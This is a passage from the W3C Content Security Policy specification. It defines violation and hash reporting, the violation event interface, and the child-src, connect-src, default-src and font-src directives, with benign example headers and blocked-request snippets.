[policy](#content-security-policy-object)'s directives is violated, a [csp violation
report] may be generated and sent out to a reporting endpoint
associated with the
[policy](#content-security-policy-object).

[csp violation
reports](#csp-violation-report) have the [report
type](https://w3c.github.io/reporting/#report-type) \"csp-violation\".

[csp violation
reports](#csp-violation-report) are [visible to
`ReportingObserver`s](https://w3c.github.io/reporting/#visible-to-reportingobservers).

```
dictionary CSPViolationReportBody : ReportBody {
 USVString documentURL;
 USVString? referrer;
 USVString? blockedURL;
 DOMString effectiveDirective;
 DOMString originalPolicy;
 USVString? sourceFile;
 DOMString? sample;
 SecurityPolicyViolationEventDisposition disposition;
 unsigned short statusCode;
 unsigned long? lineNumber;
 unsigned long? columnNumber;
};
```

When a directive that impacts
[script-like](https://fetch.spec.whatwg.org/#request-destination-script-like)
[destinations](https://fetch.spec.whatwg.org/#concept-request-destination) has a `report-sha256`, `report-sha384` or
`report-sha512` value, and a
[request](https://fetch.spec.whatwg.org/#concept-request) with a
[script-like](https://fetch.spec.whatwg.org/#request-destination-script-like)
[destination](https://fetch.spec.whatwg.org/#concept-request-destination) is fetched, a [csp hash report] will be generated and sent out to
a reporting endpoint associated with the
[policy](#content-security-policy-object).

[csp hash reports](#csp-hash-report) have the [report
type](https://w3c.github.io/reporting/#report-type) \"csp-hash\".

[csp hash reports](#csp-hash-report) are not [visible to
`ReportingObserver`s](https://w3c.github.io/reporting/#visible-to-reportingobservers).

A [csp hash report body] is a
[struct](https://infra.spec.whatwg.org/#struct) with the following fields:
[documentURL],
[subresourceURL],
[hash],
[destination],
[type].

When a document's response contains
the headers:

```
Reporting-Endpoints: hashes-endpoint="https://example.com/reports"
Content-Security-Policy: script-src 'self' 'report-sha256'; report-to hashes-endpoint
```

and the document loads the script \"main.js\", a report similar to the
following one will be sent:

```
POST /reports HTTP/1.1
Host: example.com
...
Content-Type: application/reports+json

[{
 "type": "csp-hash",
 "age": 12,
 "url": "https://example.com/",
 "user_agent": "Mozilla/5.0 (X11; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0",
 "body": {
 "document_url": "https://example.com/",
 "subresource_url": "https://example.com/main.js",
 "hash": "sha256-85738f8f9a7f1b04b5329c590ebcb9e425925c6d0984089c43a022de4f19c281",
 "type": "subresource",
 "destination": "script"
 }
}]
```

### 5.1. Violation DOM Events

```
enum SecurityPolicyViolationEventDisposition {
 "enforce", "report"
};

[Exposed=(Window,Worker)]
interface SecurityPolicyViolationEvent : Event {
 constructor(DOMString type, optional SecurityPolicyViolationEventInit eventInitDict = );
 readonly attribute USVString documentURI;
 readonly attribute USVString referrer;
 readonly attribute USVString blockedURI;
 readonly attribute DOMString effectiveDirective;
 readonly attribute DOMString violatedDirective; // historical alias of effectiveDirective
 readonly attribute DOMString originalPolicy;
 readonly attribute USVString sourceFile;
 readonly attribute DOMString sample;
 readonly attribute SecurityPolicyViolationEventDisposition disposition;
 readonly attribute unsigned short statusCode;
 readonly attribute unsigned long lineNumber;
 readonly attribute unsigned long columnNumber;
};

dictionary SecurityPolicyViolationEventInit : EventInit {
 USVString documentURI = "";
 USVString referrer = "";
 USVString blockedURI = "";
 DOMString violatedDirective = "";
 DOMString effectiveDirective = "";
 DOMString originalPolicy = "";
 USVString sourceFile = "";
 DOMString sample = "";
 SecurityPolicyViolationEventDisposition disposition = "enforce";
 unsigned short statusCode = 0;
 unsigned long lineNumber = 0;
 unsigned long columnNumber = 0;
};
```

### 5.2. Obtain the [`blockedURI` of a violation's `resource` ]
Given a violation's
[resource](#violation-resource) `resource`, this algorithm returns a
[string](https://infra.spec.whatwg.org/#string), to be used as the blocked URI field for violation
reports.

1. Assert: `resource` is a
 [URL](https://url.spec.whatwg.org/#concept-url) or a
 [string](https://infra.spec.whatwg.org/#string).

2. If `resource` is a
 [URL](https://url.spec.whatwg.org/#concept-url), return the result of executing [§ 5.4 Strip URL
 for use in reports](#strip-url-for-use-in-reports) on
 `resource`.

3. Return `resource`.

### 5.3. Obtain the deprecated serialization of `violation`

Given a [violation](#violation)
`violation`, this algorithm returns a JSON text string
representation of the violation, suitable for submission to a reporting
endpoint associated with the deprecated
[`report-uri`](#report-uri)
directive.

1. Let `body` be a
 [map](https://infra.spec.whatwg.org/#ordered-map) with its keys initialized as follows:

 \"`document-uri`\"

 : The result of executing [§ 5.4 Strip URL for use in
 reports](#strip-url-for-use-in-reports) on
 `violation`'s
 [url](#violation-url).

 \"`referrer`\"

 : The result of executing [§ 5.4 Strip URL for use in
 reports](#strip-url-for-use-in-reports) on
 `violation`'s
 [referrer](#violation-referrer).

 \"`blocked-uri`\"

 : The result of executing [§ 5.2 Obtain the blockedURI of a
 violation's resource](#obtain-violation-blocked-uri) on
 `violation`'s
 [resource](#violation-resource).

 \"`effective-directive`\"

 : `violation`'s [effective
 directive](#violation-effective-directive)

 \"`violated-directive`\"

 : `violation`'s [effective
 directive](#violation-effective-directive)

 \"`original-policy`\"

 : The [serialization](#serialized-csp) of `violation`'s
 [policy](#violation-policy)

 \"`disposition`\"

 : The
 [disposition](#policy-disposition) of `violation`'s
 [policy](#violation-policy)

 \"`status-code`\"

 : `violation`'s
 [status](#violation-status)

 \"`script-sample`\"

 : `violation`'s
 [sample](#violation-sample)

 The name `script-sample` was chosen for
 compatibility with an earlier iteration of this feature which
 has shipped in Firefox since its initial implementation of CSP.
 Despite the name, this field will contain samples for non-script
 violations, like stylesheets. The data contained in a
 [`SecurityPolicyViolationEvent`](#securitypolicyviolationevent) object, and in reports generated via the new
 [`report-to`](#report-to)
 directive, is named in a more encompassing fashion:
 [`sample`](#dom-securitypolicyviolationevent-sample).

2. If `violation`'s [source
 file](#violation-source-file) is not null:

 1. Set `body`\[\"`source-file`\'\] to the result of
 executing [§ 5.4 Strip URL for use in
 reports](#strip-url-for-use-in-reports) on
 `violation`'s [source
 file](#violation-source-file).

 2. Set `body`\[\"`line-number`\"\] to
 `violation`'s [line
 number](#violation-line-number).

 3. Set `body`\[\"`column-number`\"\] to
 `violation`'s [column
 number](#violation-column-number).

3. Assert: If `body`\[\"`blocked-uri`\"\] is not
 \"`inline`\", then `body`\[\"`sample`\"\] is the empty
 string.

4. Return the result of [serialize an infra value to JSON
 bytes](https://infra.spec.whatwg.org/#serialize-an-infra-value-to-json-bytes) given «\[ \"csp-report\" → body \]».

### 5.4. Strip URL for use in reports

Given a
[URL](https://url.spec.whatwg.org/#concept-url) `url`, this algorithm returns a string
representing the URL for use in violation reports:

1. If `url`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme) is not an [HTTP(S)
 scheme](https://fetch.spec.whatwg.org/#http-scheme), then return `url`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme).

2. Set `url`'s
 [fragment](https://url.spec.whatwg.org/#concept-url-fragment) to the empty string.

3. Set `url`'s
 [username](https://url.spec.whatwg.org/#concept-url-username) to the empty string.

4. Set `url`'s
 [password](https://url.spec.whatwg.org/#concept-url-password) to the empty string.

5. Return the result of executing the [URL
 serializer](https://url.spec.whatwg.org/#concept-url-serializer) on `url`.

### 5.5. Report a `violation`

Given a [violation](#violation)
`violation`, this algorithm reports it to the endpoint
specified in `violation`'s
[policy](#violation-policy),
and fires a
[`SecurityPolicyViolationEvent`](#securitypolicyviolationevent) at `violation`'s
[element](#violation-element), or at `violation`'s [global
object](#violation-global-object) as described below:

1. Let `global` be `violation`'s [global
 object](#violation-global-object).

2. Let `target` be `violation`'s
 [element](#violation-element).

3. [Queue a
 task](https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-task) to run the following steps:

 We \"queue a task\" here to ensure that the event
 targeting and dispatch happens after JavaScript completes execution
 of the task responsible for a given violation (which might
 manipulate the DOM).

 1. If `target` is not null, and `global` is a
 [`Window`](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window), and `target`'s [shadow-including
 root](https://dom.spec.whatwg.org/#concept-shadow-including-root) is not `global`'s [associated
 `Document`](https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window), set `target` to null.

 This ensures that we fire events only at
 elements
 [connected](https://dom.spec.whatwg.org/#connected) to `violation`'s
 [policy](#violation-policy)'s
 [`Document`](https://dom.spec.whatwg.org/#document). If a violation is caused by an element which
 isn't connected to that document, we'll fire the event at the
 document rather than the element in order to ensure that the
 violation is visible to the document's listeners.

 2. If `target` is null:

 1. Set `target` to `violation`'s [global
 object](#violation-global-object).

 2. If `target` is a
 [`Window`](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window), set `target` to
 `target`'s [associated
 `Document`](https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window).

 3. If `target`
 [implements](https://webidl.spec.whatwg.org/#implements)
 [`EventTarget`](https://dom.spec.whatwg.org/#eventtarget), [fire an
 event](https://dom.spec.whatwg.org/#concept-event-fire) named
 [`securitypolicyviolation`] that uses the
 [`SecurityPolicyViolationEvent`](#securitypolicyviolationevent) interface at `target` with its
 attributes initialized as follows:

 [`documentURI`](#dom-securitypolicyviolationevent-documenturi)

 : The result of executing [§ 5.4 Strip URL for use in
 reports](#strip-url-for-use-in-reports) on
 `violation`'s
 [url](#violation-url).

 [`referrer`](#dom-securitypolicyviolationevent-referrer)

 : The result of executing [§ 5.4 Strip URL for use in
 reports](#strip-url-for-use-in-reports) on
 `violation`'s
 [referrer](#violation-referrer).

 [`blockedURI`](#dom-securitypolicyviolationevent-blockeduri)

 : The result of executing [§ 5.2 Obtain the blockedURI of a
 violation's resource](#obtain-violation-blocked-uri) on
 `violation`'s
 [resource](#violation-resource).

 [`effectiveDirective`](#dom-securitypolicyviolationevent-effectivedirective)

 : `violation`'s [effective
 directive](#violation-effective-directive)

 [`violatedDirective`](#dom-securitypolicyviolationevent-violateddirective)

 : `violation`'s [effective
 directive](#violation-effective-directive)

 [`originalPolicy`](#dom-securitypolicyviolationevent-originalpolicy)

 : The
 [serialization](#serialized-csp) of `violation`'s
 [policy](#violation-policy)

 [`disposition`](#dom-securitypolicyviolationevent-disposition)

 : `violation`'s
 [disposition](#violation-disposition)

 [`sourceFile`](#dom-securitypolicyviolationevent-sourcefile)

 : The result of executing [§ 5.4 Strip URL for use in
 reports](#strip-url-for-use-in-reports) on
 `violation`'s [source
 file](#violation-source-file), if `violation`'s [source
 file](#violation-source-file) is not null, or null otherwise.

 [`statusCode`](#dom-securitypolicyviolationevent-statuscode)

 : `violation`'s
 [status](#violation-status)

 [`lineNumber`](#dom-securitypolicyviolationevent-linenumber)

 : `violation`'s [line
 number](#violation-line-number)

 [`columnNumber`](#dom-securitypolicyviolationevent-columnnumber)

 : `violation`'s [column
 number](#violation-column-number)

 [`sample`](#dom-securitypolicyviolationevent-sample)

 : `violation`'s
 [sample](#violation-sample)

 [`bubbles`](https://dom.spec.whatwg.org/#dom-event-bubbles)

 : `true`

 [`composed`](https://dom.spec.whatwg.org/#dom-event-composed)

 : `true`

 We set the
 [`composed`](https://dom.spec.whatwg.org/#dom-event-composed) attribute, which means that this event can be
 captured on its way into, and will bubble its way out of a
 shadow tree.
 [`target`](https://dom.spec.whatwg.org/#dom-event-target), et al will be automagically scoped correctly
 for the main tree.

 Both
 [`effectiveDirective`](#dom-securitypolicyviolationevent-effectivedirective) and
 [`violatedDirective`](#dom-securitypolicyviolationevent-violateddirective) are the same value. This is intentional to
 maintain backwards compatibility.

 4. If `violation`'s
 [policy](#violation-policy)'s [directive
 set](#policy-directive-set) contains a
 [directive](#directives)
 named \"[`report-uri`](#report-uri)\" `directive`:

 1. If `violation`'s
 [policy](#violation-policy)'s [directive
 set](#policy-directive-set) contains a
 [directive](#directives) named
 \"[`report-to`](#report-to)\", skip the remaining substeps.

 2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `token` of
 `directive`'s
 [value](#directive-value):

 1. Let `endpoint` be the result of executing the
 [URL
 parser](https://url.spec.whatwg.org/#concept-url-parser) with `token` as the input,
 and `violation`'s
 [url](#violation-url) as the [base
 URL](https://url.spec.whatwg.org/#concept-base-url).

 2. If `endpoint` is not a valid URL, skip the
 remaining substeps.

 3. Let `request` be a new
 [request](https://fetch.spec.whatwg.org/#concept-request), initialized as follows:

 [method](https://fetch.spec.whatwg.org/#concept-request-method)

 : \"`POST`\"

 [url](https://fetch.spec.whatwg.org/#concept-request-url)

 : `endpoint`

 [origin](https://fetch.spec.whatwg.org/#concept-request-origin)

 : `violation`'s [global
 object](#violation-global-object)'s [relevant settings
 object](https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object)'s
 [origin](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin)

 [traversable for user prompts](https://fetch.spec.whatwg.org/#concept-request-window)

 : \"`no-traversable`\"

 [client](https://fetch.spec.whatwg.org/#concept-request-client)

 : `violation`'s [global
 object](#violation-global-object)'s [relevant settings
 object](https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object)

 [destination](https://fetch.spec.whatwg.org/#concept-request-destination)

 : \"`report`\"

 [initiator](https://fetch.spec.whatwg.org/#concept-request-initiator)

 : \"\"

 [credentials mode](https://fetch.spec.whatwg.org/#concept-request-credentials-mode)

 : \"`same-origin`\"

 [keepalive](https://fetch.spec.whatwg.org/#request-keepalive-flag)

 : \"`true`\"

 [header list](https://fetch.spec.whatwg.org/#concept-request-header-list)

 : A header list containing a single header whose name
 is \"`Content-Type`\", and value is
 \"`application/csp-report`\"

 [body](https://fetch.spec.whatwg.org/#concept-request-body)

 : The result of executing [§ 5.3 Obtain the deprecated
 serialization of
 violation](#deprecated-serialize-violation) on
 `violation`

 [redirect mode](https://fetch.spec.whatwg.org/#concept-request-redirect-mode)

 : \"`error`\"

 `request`'s
 [mode](https://fetch.spec.whatwg.org/#concept-request-mode) defaults to \"`no-cors`\"; the response
 is ignored entirely.

 4. [Fetch](https://fetch.spec.whatwg.org/#concept-fetch) `request`. The result will
 be ignored.

 All of this should be considered deprecated. It
 sends a single request per violation, which simply isn't
 scalable. As soon as this behavior can be removed from user
 agents, it will be.

 `report-uri` only takes effect if `report-to`
 is not present. That is, the latter overrides the former,
 allowing for backwards compatibility with browsers that don't
 support the new mechanism.

 5. If `violation`'s
 [policy](#violation-policy)'s [directive
 set](#policy-directive-set) contains a
 [directive](#directives)
 named \"[`report-to`](#report-to)\" `directive`:

 1. Let `body` be a new
 [`CSPViolationReportBody`](#dictdef-cspviolationreportbody), initialized as follows:

 [`documentURL`](#dom-cspviolationreportbody-documenturl)

 : The result of executing [§ 5.4 Strip URL for use in
 reports](#strip-url-for-use-in-reports) on
 `violation`'s
 [url](#violation-url).

 [`referrer`](#dom-cspviolationreportbody-referrer)

 : The result of executing [§ 5.4 Strip URL for use in
 reports](#strip-url-for-use-in-reports) on
 `violation`'s
 [referrer](#violation-referrer).

 [`blockedURL`](#dom-cspviolationreportbody-blockedurl)

 : The result of executing [§ 5.2 Obtain the blockedURI of
 a violation's resource](#obtain-violation-blocked-uri)
 on `violation`'s
 [resource](#violation-resource).

 [`effectiveDirective`](#dom-cspviolationreportbody-effectivedirective)

 : `violation`'s [effective
 directive](#violation-effective-directive).

 [`originalPolicy`](#dom-cspviolationreportbody-originalpolicy)

 : The
 [serialization](#serialized-csp) of `violation`'s
 [policy](#violation-policy).

 [`sourceFile`](#dom-cspviolationreportbody-sourcefile)

 : The result of executing [§ 5.4 Strip URL for use in
 reports](#strip-url-for-use-in-reports) on
 `violation`'s [source
 file](#violation-source-file), if `violation`'s [source
 file](#violation-source-file) is not null, or null otherwise.

 [`sample`](#dom-cspviolationreportbody-sample)

 : `violation`'s
 [sample](#violation-sample).

 [`disposition`](#dom-cspviolationreportbody-disposition)

 : `violation`'s
 [disposition](#violation-disposition).

 [`statusCode`](#dom-cspviolationreportbody-statuscode)

 : `violation`'s
 [status](#violation-status).

 [`lineNumber`](#dom-cspviolationreportbody-linenumber)

 : `violation`'s [line
 number](#violation-line-number), if `violation`'s [source
 file](#violation-source-file) is not null, or null otherwise.

 [`columnNumber`](#dom-cspviolationreportbody-columnnumber)

 : `violation`'s [column
 number](#violation-column-number), if `violation`'s [source
 file](#violation-source-file) is not null, or null otherwise.

 2. Let `settings object` be `violation`'s
 [global
 object](#violation-global-object)'s [relevant settings
 object](https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object).

 3. [Generate and queue a
 report](https://www.w3.org/TR/reporting-1/#generate-and-queue-a-report) with the following arguments:

 `context`

 : `settings object`

 `type`

 : \"csp-violation\"

 `destination`

 : `directive`'s
 [value](#directive-value).

 `data`

 : `body`

## 6. Content Security Policy Directives

This specification defines a number of types of
[directives](#directives) which
allow developers to control certain aspects of their sites\' behavior.
This document defines directives which govern resource fetching (in
[§ 6.1 Fetch Directives](#directives-fetch)), directives which govern
the state of a document (in [§ 6.3 Document
Directives](#directives-document)), directives which govern aspects of
navigation (in [§ 6.4 Navigation Directives](#directives-navigation)),
and directives which govern reporting (in [§ 6.5 Reporting
Directives](#directives-reporting)). These form the core of Content
Security Policy; other directives are defined in a modular fashion in
ancillary documents (see [§ 6.6 Directives Defined in Other
Documents](#directives-elsewhere) for examples).

To mitigate the risk of cross-site scripting attacks, web developers
SHOULD include directives that regulate sources of script and plugins.
They can do so by including:

- Both the [script-src](#script-src) and [object-src](#object-src) directives, or

- a [default-src](#default-src)
 directive

In either case, developers SHOULD NOT include either
[`'unsafe-inline'`](#grammardef-unsafe-inline), or `data:` as valid sources in their policies.
Both enable XSS attacks by allowing code to be included directly in the
document itself; they are best avoided completely.

### 6.1. Fetch Directives

[Fetch directives] control the locations from which certain resource types may
be loaded. For instance, [script-src](#script-src) allows developers to allow trusted sources of script to
execute on a page, while [font-src](#font-src) controls the sources of web fonts.

#### 6.1.1. `child-src`

The [`child-src`]
directive governs the creation of [child
navigables](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable) (e.g.
[`iframe`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element) and
[`frame`](https://html.spec.whatwg.org/multipage/obsolete.html#frame) navigations) and Worker execution contexts. The
syntax for the directive's name and value is described by the following
ABNF:

 directive-name = "child-src"
 directive-value = serialized-source-list

This directive controls
[requests](https://fetch.spec.whatwg.org/#concept-request) which will populate a frame or a worker. More formally,
[requests](https://fetch.spec.whatwg.org/#concept-request) falling into one of the following categories:

- [destination](https://fetch.spec.whatwg.org/#concept-request-destination) is \"`frame`\", \"`iframe`\", \"`object`\", or
 \"`embed`\".

- [destination](https://fetch.spec.whatwg.org/#concept-request-destination) is either \"`serviceworker`\", \"`sharedworker`\", or
 \"`worker`\" (which are fed to the [run a
 worker](https://html.spec.whatwg.org/multipage/workers.html#run-a-worker) algorithm for
 [`ServiceWorker`](https://www.w3.org/TR/service-workers/#serviceworker),
 [`SharedWorker`](https://html.spec.whatwg.org/multipage/workers.html#sharedworker), and
 [`Worker`](https://html.spec.whatwg.org/multipage/workers.html#worker), respectively).

Given a page with the following
Content Security Policy:

 Content-Security-Policy: child-src https://example.com/

Fetches for the following code will all return network errors, as the
URLs provided do not match `child-src`'s [source
list](#source-lists):

``` highlight
<iframe src="https://example.org"></iframe>
<script>
 var blockedWorker = new Worker("data:application/javascript,...");
</script>
```

##### 6.1.1.1. `child-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `child-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. Return the result of executing the [pre-request
 check](#directive-pre-request-check) for the
 [directive](#directives)
 whose [name](#directive-name) is `name` on `request` and
 `policy`, using this directive's
 [value](#directive-value) for the comparison.

##### 6.1.1.2. `child-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `child-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. Return the result of executing the [post-request
 check](#directive-post-request-check) for the
 [directive](#directives)
 whose [name](#directive-name) is `name` on `request`,
 `response`, and `policy`, using this
 directive's [value](#directive-value) for the comparison.

#### 6.1.2. `connect-src`

The [connect-src] directive restricts the URLs which can be loaded using script
interfaces. The syntax for the directive's name and value is described
by the following ABNF:

 directive-name = "connect-src"
 directive-value = serialized-source-list

This directive controls
[requests](https://fetch.spec.whatwg.org/#concept-request) which transmit or receive data from other origins. This
includes APIs like `fetch()`,
[\[XHR\]](#biblio-xhr "XMLHttpRequest Standard"),
[\[EVENTSOURCE\]](#biblio-eventsource "Server-Sent Events"),
[\[BEACON\]](#biblio-beacon "Beacon"), and
[`a`](https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element)'s
[`ping`](https://html.spec.whatwg.org/multipage/links.html#ping). This directive *also* controls WebSocket
[\[WEBSOCKETS\]](#biblio-websockets "WebSockets Standard")
connections, though those aren't technically part of Fetch.

JavaScript offers a few mechanisms
that directly connect to an external server to send or receive
information. `EventSource` maintains an open HTTP connection to a server
in order to receive push notifications, `WebSockets` open a
bidirectional communication channel between your browser and a server,
and `XMLHttpRequest` makes arbitrary HTTP requests on your behalf. These
are powerful APIs that enable useful functionality, but also provide
tempting avenues for data exfiltration.

The `connect-src` directive allows you to ensure that these and similar
sorts of connections are only opened to origins you trust. Sending a
policy that defines a list of source expressions for this directive is
straightforward. For example, to limit connections to only
`https://example.com`, send the following header:

 Content-Security-Policy: connect-src https://example.com/

Fetches for the following code will all return network errors, as the
URLs provided do not match `connect-src`'s [source
list](#source-lists):

``` highlight
<a ping="https://example.org">...
<script>
 var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://example.org/');
 xhr.send();

 var ws = new WebSocket("wss://example.org/");

 var es = new EventSource("https://example.org/");

 navigator.sendBeacon("https://example.org/", { ... });
</script>
```

##### 6.1.2.1. `connect-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `connect-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

##### 6.1.2.2. `connect-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `connect-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

#### 6.1.3. `default-src`

The [default-src] directive serves as a fallback for the other [fetch
directives](#fetch-directives). The syntax for the directive's name and value is
described by the following ABNF:

 directive-name = "default-src"
 directive-value = serialized-source-list

If a [default-src](#default-src)
directive is present in a policy, its value will be used as the policy's
default source list. That is, given
`default-src 'none'; script-src 'self'`, script requests will use
`'self'` as the [source list](#source-lists) to match against. Other requests will use `'none'`.
This is spelled out in more detail in the [§ 4.1.2 Should request be
blocked by Content Security
Policy?](#should-block-request) and
[§ 4.1.3 Should response to request be blocked by Content Security
Policy?](#should-block-response)
algorithms.

Resource hints such as
[`prefetch`](https://html.spec.whatwg.org/#link-type-prefetch) and
[`preconnect`](https://html.spec.whatwg.org/#link-type-preconnect) generate requests that aren't tied to any
specific [fetch directive](#fetch-directives), but are instead governed by the union of servers
allowed in all of a policy's directives\' [source
lists](#source-lists). If
[default-src](#default-src) is
not specified, these requests will always be allowed. For more
information, see [§ 8.6 Exfiltration](#exfiltration).
[\[HTML\]](#biblio-html "HTML Standard")

The following header:

 Content-Security-Policy: default-src 'self'

will have the same behavior as the following header:

 Content-Security-Policy: connect-src 'self';
 font-src 'self';
 frame-src 'self';
 img-src 'self';
 manifest-src 'self';
 media-src 'self';
 object-src 'self';
 script-src-elem 'self';
 script-src-attr 'self';
 style-src-elem 'self';
 style-src-attr 'self';
 worker-src 'self'

That is, when `default-src` is set, every [fetch
directive](#fetch-directives) that isn't explicitly set will fall back to the value
`default-src` specifies.

There is no inheritance. If a
`script-src` directive is explicitly specified, for example, then the
value of `default-src` has no influence on script requests. That is, the
following header:

 Content-Security-Policy: default-src 'self'; script-src-elem https://example.com

will have the same behavior as the following header:

 Content-Security-Policy: connect-src 'self';
 font-src 'self';
 frame-src 'self';
 img-src 'self';
 manifest-src 'self';
 media-src 'self';
 object-src 'self';
 script-src-elem https://example.com;
 script-src-attr 'self';
 style-src-elem 'self';
 style-src-attr 'self';
 worker-src 'self'

Given this behavior, one good way to build a policy for a site would be
to begin with a `default-src` of `'none'`, and to build up a policy from
there which allowed only those resource types which are necessary for
the particular page the policy will apply to.

##### 6.1.3.1. `default-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `default-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. Return the result of executing the [pre-request
 check](#directive-pre-request-check) for the
 [directive](#directives)
 whose [name](#directive-name) is `name` on `request` and
 `policy`, using this directive's
 [value](#directive-value) for the comparison.

##### 6.1.3.2. `default-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `default-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. Return the result of executing the [post-request
 check](#directive-post-request-check) for the
 [directive](#directives)
 whose [name](#directive-name) is `name` on `request`,
 `response`, and `policy`, using this
 directive's [value](#directive-value) for the comparison.

##### 6.1.3.3. `default-src` Inline Check

This directive's [inline
check](#directive-inline-check) algorithm is as follows:

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, a string `type`, a
[policy](#content-security-policy-object) `policy` and a string `source`:

1. Let `name` be the result of executing [§ 6.8.2 Get the
 effective directive for inline
 checks](#effective-directive-for-inline-check) on `type`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `default-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. Otherwise, return the result of executing the [inline
 check](#directive-inline-check) for the
 [directive](#directives)
 whose [name](#directive-name) is `name` on `element`,
 `type`, `policy` and `source`,
 using this directive's
 [value](#directive-value) for the comparison.

#### 6.1.4. `font-src`

The [font-src]
directive restricts the URLs from which font resources may be loaded.
The syntax for the directive's name and value is described by the
following ABNF:

 directive-name = "font-src"
 directive-value = serialized-source-list

Given a page with the following
Content Security Policy:

 Content-Security-Policy: font-src https://example.com/

Fetches for the following code will return a network error, as the URL
provided does not match `font-src`'s [source
list](#source-lists):

``` highlight
<style>
 @font-face {
 font-family: "Example Font";
 src: url("https://example.org/font");
 }
 body {
 font-family: "Example Font";
 }
</style>
```

##### 6.1.4.1. `font-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`, `font-src`
 and `policy` is \"`No`\", return \"`Allowed`\".

3. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

##### 6.1.4.2. `font-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`, `font-src`
 and `policy` is \"`No`\", return \"`Allowed`\".

3. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
